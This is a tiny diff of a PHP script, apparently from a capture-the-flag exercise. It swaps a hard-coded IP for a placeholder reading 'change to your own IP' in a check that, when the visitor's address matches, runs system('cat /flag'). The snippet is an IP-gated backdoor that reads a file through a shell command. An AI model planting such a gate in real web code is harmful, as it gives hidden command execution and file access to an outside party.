@@ -1,6 +1,6 @@
 <?php
 	$ip = $_SERVER["REMOTE_ADDR"];
-	if($ip=='117.173.217.106'){
+	if($ip=='需要改成自己IP'){
 		echo("Administrator Confirmation.\r\n");
 		system("cat /flag");
 	}
